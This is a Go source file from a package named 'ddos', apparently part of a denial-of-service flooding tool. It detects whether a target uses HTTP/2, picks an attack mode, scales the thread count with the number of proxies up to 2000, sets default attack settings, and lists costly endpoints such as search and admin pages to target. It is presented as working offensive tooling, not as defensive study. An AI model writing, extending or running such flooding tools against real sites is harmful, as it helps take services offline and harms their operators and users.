package ddos

import (
	"net/http"
	"strings"
	"time"
)

// TargetInfo holds information about the target
type TargetInfo struct {
	URL           string
	Protocol      string // "http" or "https"
	SupportsHTTP2 bool
	HasProxies    bool
	ProxyCount    int
}

// DetectTargetCapabilities detects target capabilities
func DetectTargetCapabilities(targetURL string, availableProxies int) TargetInfo {
	info := TargetInfo{
		URL:        targetURL,
		HasProxies: availableProxies > 0,
		ProxyCount: availableProxies,
	}

	// Detect protocol
	if strings.HasPrefix(targetURL, "https://") {
		info.Protocol = "https"
		// Test HTTP/2 support (simple heuristic - assume HTTPS supports HTTP/2)
		info.SupportsHTTP2 = true
	} else {
		info.Protocol = "http"
		info.SupportsHTTP2 = false
	}

	return info
}

// SuggestOptimalAttackMode suggests the best attack mode based on target info
func SuggestOptimalAttackMode(info TargetInfo) AttackMode {
	if info.SupportsHTTP2 && info.Protocol == "https" {
		return ModeHTTP2
	}
	return ModeFlood // Default (most efficient)
}

// CalculateOptimalThreads calculates optimal thread count
func CalculateOptimalThreads(info TargetInfo, availableProxies int) int {
	baseThreads := 500
	if availableProxies > 0 {
		// Scale with proxy count, but cap at reasonable limit
		calculated := availableProxies * 10
		if calculated > 2000 {
			return 2000
		}
		if calculated < baseThreads {
			return baseThreads
		}
		return calculated
	}
	return baseThreads
}

// AutoDetectOptimalSettings auto-detects and applies optimal settings
func AutoDetectOptimalSettings(baseConfig DDoSConfig) *DDoSConfig {
	info := DetectTargetCapabilities(baseConfig.TargetURL, len(baseConfig.ProxyList))

	config := baseConfig

	// Suggest attack mode if not set
	if config.AttackMode == "" {
		config.AttackMode = SuggestOptimalAttackMode(info)
	}

	// Calculate optimal threads if not set
	if config.MaxThreads <= 0 {
		config.MaxThreads = CalculateOptimalThreads(info, len(config.ProxyList))
	}

	// Set default duration if not set
	if config.Duration <= 0 {
		config.Duration = 60 * time.Second
	}

	// All efficiency features are always enabled (no config needed)
	// Connection pooling, fire-and-forget, response skipping, randomization are defaults

	return &config
}

// FindExpensiveEndpoints attempts to find expensive endpoints (placeholder for future implementation)
func FindExpensiveEndpoints(targetURL string) []string {
	// This would typically scan the target for expensive endpoints
	// For now, return common expensive endpoints
	return []string{
		"/api/search",
		"/api/users",
		"/api/products",
		"/search",
		"/admin",
	}
}

// TestHTTP2Support tests if target supports HTTP/2
func TestHTTP2Support(targetURL string) bool {
	if !strings.HasPrefix(targetURL, "https://") {
		return false
	}

	// Simple test - try to connect with HTTP/2
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false
	}

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Check if HTTP/2 was used
	return resp.ProtoMajor == 2
}

